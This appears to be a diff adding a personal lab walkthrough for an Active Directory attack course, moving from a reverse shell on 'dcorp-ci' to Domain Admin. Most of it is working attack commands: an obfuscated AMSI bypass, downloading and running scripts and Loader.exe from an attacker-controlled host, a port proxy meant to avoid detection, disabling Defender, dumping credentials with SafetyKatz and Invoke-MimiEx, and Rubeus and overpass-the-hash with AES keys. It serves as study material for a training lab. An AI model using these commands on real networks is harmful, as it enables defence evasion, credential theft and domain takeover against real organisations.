@@ -1,1 +1,83 @@
 
+Task 1:
+Identify a machine in the target domain where a Domain Admin session is available.
+
+Steps:
+Fiest we have to bypass Scriptblocklogging and AMSI on corp-ci machien we we got a reverse shell through jankins
+-> iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
+Note:(sbloggingbypass.txt should present in HFS server in student machine)
+-> For AMSI Bypass
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
+Now, download and execute PowerView in memory of the reverse shell dcorp-ci machine
+-> iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1'))
+Now FindDomainUserLocation where domain user session is avilable
+-> Find-DomainUserLocation
+As Result we got to know user: svcadmin  and computername:dcorp-mgxx.dollarcorp.moneycorp.local Which session is Avilable 
+Now run command using winrs to access dcorp-mgmt machine from dcorp-ci machine:
+-> winrs -r:dcorp-mgmt hostname;whoami
+
+Now Extract credentials from  dcorp-mgmt 
+For that, we need to copy Loader.exe on dcorp-mgmt. Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt.
+From dcorp-ci machine
+Copying to dcorp-ci machine
+-> iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
+Copying to dcorp-mgmt machine
+-> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt:
+-> $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+Use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt:
+-> $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+Notw: (make sure SafetyKatz.exe is in hfs server)
+
+Now Navigate to student machine and run cmd as Administrator:
+-> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+Note: aes256 key is from svcadmin which we grab previous step
+Now you will see another cmd will popup which is run as svcadmin:
+To access it remote shell for svcadmin
+-> winrs -r:dcorp-dc cmd
+
+
+To get Derivative Local Admin prev:
+From Student machince cmd
+-> InvisiShell
+->  . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+->  Find-PSRemotingLocalAdminAccess
+Now we can see we have admin access to dcorp-adminsrv
+Lets access dcorp-adminsrv using powershell remoting
+-> Enter-PSSession dcorp-adminsrv
+From adminsrv run command:
+->  Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+
+On student machine run the following command from a PowerShell session to copy Invoke-MimiEx.ps1 in dcorp-adminsrv  
+-> Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorpadminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+The file Invoke-MimiEx.ps1 is copied to the dcorp-adminsrv server.
+Now access dcorp-adminsrv machine using powershell remoting
+-> Enter-PSSession dcorp-adminsrv
+-> cd 'C:\Program Files\'
+->  .\Invoke-MimiEx.ps1  (Note: will get credentials for 3 users)
+
+Now we do overpass the hash to to get access srvadmin system 
+Run cmd as admin from VM machine:
+-> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 
+/run:cmd.exe" "exit"
+
+Now Check if srvadmin has admin privileges on any other 
+Run bwlow command from cmd which we got from previous command:
+-> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+-> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+-> Find-PSRemotingLocalAdminAccess -Verbose
+Now we got to know as below users having admin access srvadmin to both system that we got output from previous command
+dcorp-adminsrv
+dcorp-mgmt
+
+Now already we are domain admin Hurry!
+
+
+
+
+
+
+
+
+
